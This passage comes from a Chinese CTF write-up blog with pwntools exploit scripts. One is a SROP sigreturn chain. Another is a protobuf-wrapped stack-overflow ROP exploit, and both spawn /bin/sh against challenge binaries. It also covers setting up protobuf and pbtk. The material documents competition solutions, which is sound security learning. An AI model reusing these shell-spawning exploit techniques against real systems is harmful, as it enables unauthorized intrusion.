= ELF(<span class="hljs-string">&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so&#x27;</span>)    <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;39.106.48.123&quot;</span>,<span class="hljs-number">35414</span>)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">text</span>):<br>    sla(<span class="hljs-string">b&#x27;choice &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,text</span>):<br>    sla(<span class="hljs-string">b&#x27;choice &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;choice &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;choice &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment"># for i in range(8):</span><br><span class="hljs-comment">#     add(b&#x27;a&#x27;*0x200)</span><br><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>)<br><br><br>pop_rax_rbp = <span class="hljs-number">0x0404408</span><br>pop_rdx = <span class="hljs-number">0x47a8fa</span><br>syscall = <span class="hljs-number">0x040316c</span><br><span class="hljs-comment"># xchg_edi_eax = 0x0465d09</span><br>rdi = <span class="hljs-number">0x0462946</span><br>rsi = <span class="hljs-number">0x0475834</span><br><span class="hljs-comment"># mov qword ptr [rsi], rax ; add rsp, 0x60 ; pop rbp ; ret</span><br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">0</span><br>sigframe.rdi = <span class="hljs-number">0</span><br>sigframe.rsi = <span class="hljs-number">0x558100</span><br>sigframe.rdx = <span class="hljs-number">0x200</span><br>sigframe.rsp = <span class="hljs-number">0x558100</span><br>sigframe.rip = syscall<br><span class="hljs-comment"># pay += bytes(sigframe)</span><br><span class="hljs-comment"># sl(pay)</span><br><br><span class="hljs-comment"># payload = p64(rdi)+p64(0xc00000fde8)+p64(pop_rdx)+p64(0)</span><br><span class="hljs-comment"># payload += p64(pop_rax_rbp)+p64(0x3b)*2 + p64(syscall)</span><br><br>payload = p64(pop_rax_rbp) + p64(<span class="hljs-number">0xf</span>)*<span class="hljs-number">2</span> + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe)<br><br><span class="hljs-comment"># 0xc000112000</span><br>pay1 = p64(<span class="hljs-number">0xc00000fde8</span>)+p64(<span class="hljs-number">0x100</span>)<br>pay1 = pay1*(<span class="hljs-number">0x40</span>//<span class="hljs-number">0x10</span>)<br><br>pay2 = p64(<span class="hljs-number">0xc00000fde8</span>)+p64(<span class="hljs-number">0x100</span>)<br>pay2 = pay1*(<span class="hljs-number">0x300</span>//<span class="hljs-number">0x10</span>)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># dbg(&#x27;b *0x047Fa35&#x27;)</span><br>edit(<span class="hljs-number">1</span>,pay1 + payload + pay2 +<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">0x3b</span><br>sigframe.rdi = <span class="hljs-number">0x558218</span><br>sigframe.rsi = <span class="hljs-number">0</span><br>sigframe.rdx = <span class="hljs-number">0</span><br>sigframe.rsp = <span class="hljs-number">0x558100</span><br>sigframe.rip = syscall<br><br>pay2 = p64(pop_rax_rbp) + p64(<span class="hljs-number">0xf</span>)*<span class="hljs-number">2</span> + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe)<br>pause()<br>sl(pay2+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h2><p>唉，以前偷懒，就没复现过protobuf，也没有这类的工具，没想到线下出了，题目很简单，就是普通栈溢出</p><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p><a href="https://github.com/protocolbuffers/protobuf/releases/tag/v3.21.9%EF%BC%8C%E4%B8%8B%E8%BD%BDprotobuf">https://github.com/protocolbuffers/protobuf/releases/tag/v3.21.9，下载protobuf</a></p><p>root用户下解压文件执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xzvf protobuf-cpp-3.21.9.tar.gz<br><span class="hljs-built_in">cd</span> protobuf-3.21.9<br>./autogen.sh<br>./configure --prefix=/usr/local/protobuf<br>make -j8 &amp;&amp; make install<br>ldconfig<br></code></pre></td></tr></table></figure><p>更新环境变量</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># 在/etc/profile文件中添加下面两行</span><br>export <span class="hljs-variable constant_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/local/protobuf/bin/</span><br>export <span class="hljs-variable constant_">PKG_CONFIG_PATH</span>=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/protobuf/lib</span><span class="hljs-regexp">/pkgconfig/</span><br><span class="hljs-comment"># 然后执行</span><br>source /etc/profile<br></code></pre></td></tr></table></figure><p>配置动态链接库</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 在文件/etc/ld.so.conf中添加下面一行</span><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/protobuf/</span>lib <span class="hljs-comment">#（注意: 在新行处添加）</span><br> <br><span class="hljs-comment"># 更改完成之后执行下面的命令</span><br>ldconfig<br></code></pre></td></tr></table></figure><h3 id="下载pbtk工具"><a href="#下载pbtk工具" class="headerlink" title="下载pbtk工具"></a>下载pbtk工具</h3><p>如果题目没有删除protobuf标志的话可以借助此工具，删除的话只能自己去看了</p><p><a href="https://github.com/marin-m/pbtk%EF%BC%8C%E6%AD%A4%E9%93%BE%E6%8E%A5%E4%B8%8B%E8%BD%BD">https://github.com/marin-m/pbtk，此链接下载</a></p><p>然后运行如下配置相关环境</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip3 <span class="hljs-keyword">install</span> protobuf<br>pip3 <span class="hljs-keyword">install</span> google<br>pip3 <span class="hljs-keyword">install</span> protobuf<br></code></pre></td></tr></table></figure><p>最后运行命令生产py文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">你下载的pbtk路径<span class="hljs-string">/extractors/from_binary.py</span> 题目文件 存放路径<br><span class="hljs-comment">#生产.proto文件</span><br>protoc -I=<span class="hljs-string">./</span> <span class="hljs-params">--python_out=</span><span class="hljs-string">./</span> 生成的<span class="hljs-string">.proto</span><br><span class="hljs-comment">#得到py文件，接着就可以导入库做题了</span><br></code></pre></td></tr></table></figure><p>下面是生成的proto文件内容</p><img src="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/4.png" class=""><p>最后exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>    <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(file)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;)    </span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;pwn-5519381bfe.challenge.xctf.org.cn&quot;</span>, <span class="hljs-number">9999</span>, ssl=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-keyword">import</span> message_pb2<br><span class="hljs-keyword">import</span> sys<br><br>ru(<span class="hljs-string">b&#x27;Gift: &#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">b&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>system,binsh = sb(libc_base)<br>rdi = libc_base + <span class="hljs-number">0x10f75b</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">payload</span>):<br>    msg = message_pb2.protoMessage()<br>    msg.name = <span class="hljs-string">&quot;1&quot;</span><br>    msg.phoneNumber = <span class="hljs-string">&quot;1&quot;</span><br>    msg.buffer = payload<br>    msg.size = <span class="hljs-built_in">len</span>(payload)<br>    serialized_msg = msg.SerializeToString()<br>    s(serialized_msg)<br><br><span class="hljs-comment"># dbg()</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span> + p64(rdi+<span class="hljs-number">1</span>) + p64(rdi) + p64(binsh) + p64(system)<br>pwn(payload)<br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="strlink"><a href="#strlink" class="headerlink" title="strlink"></a>strlink</h2><p>零解题，比赛时也没咋看，赛后太懒了也不想做，开摆拉</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比赛经验太少了，uaf修洞check一直不通过，还不如别人一个nop解决，还是太菜拉，应该可以带队友拿个二等奖的</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
